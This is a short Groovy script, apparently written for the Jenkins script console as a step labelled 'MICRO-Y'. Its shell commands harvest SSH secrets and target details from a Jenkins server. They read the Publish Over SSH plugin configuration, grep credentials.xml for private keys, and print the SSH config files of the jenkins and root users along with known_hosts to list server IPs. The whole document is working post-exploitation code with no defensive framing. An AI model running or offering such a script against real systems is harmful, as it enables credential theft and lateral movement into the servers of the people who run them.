// MICRO-Y: Extract Jenkins SSH plugin config + server IPs
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(15000)
    out.toString().take(6000)
}

// Find and read Jenkins SSH publisher plugin config
println "=== SSH PUBLISHER PLUGIN CONFIG ==="
println run("find /var/jenkins_home -name 'jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml' 2>/dev/null | xargs cat 2>/dev/null")

// Also look for SSH host credentials in credentials.xml
println "\n=== SSH PRIVATE KEYS IN CREDENTIALS ==="
println run("grep -A 5 -B 2 'SSHUserPrivateKey\\|BasicSSHUserPrivateKey\\|sshPrivateKey\\|<privateKey>' /var/jenkins_home/credentials.xml 2>/dev/null | head -100")

// Find all SSH-related config files
println "\n=== SSH RELATED CONFIG FILES ==="
println run("find /var/jenkins_home -name '*.xml' -not -path '*/builds/*' -not -path '*/jobs/*' 2>/dev/null | xargs grep -l 'ssh\\|SSH\\|BapSsh' 2>/dev/null | head -20")

// Look at Jenkins global config for server IPs and SSH connection details
println "\n=== GLOBAL JENKINS CONFIG SSH SECTION ==="
println run("grep -A 3 -B 2 'CSDEV\\|CSQA\\|hostname\\|publicKeyAccepted' /var/jenkins_home/jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml 2>/dev/null | head -60")

// Also check if there's an SSH config with hostnames
println "\n=== SSH CONFIG FOR jenkins USER ==="
println run("cat /var/jenkins_home/.ssh/config 2>/dev/null | head -50")
println run("cat /root/.ssh/config 2>/dev/null | head -50")
println run("cat /home/jenkins/.ssh/config 2>/dev/null | head -50")

// Check known_hosts for server IPs
println "\n=== SSH KNOWN_HOSTS ==="
println run("cat /var/jenkins_home/.ssh/known_hosts 2>/dev/null | head -30")

println "\n=== DONE MICRO-Y ==="
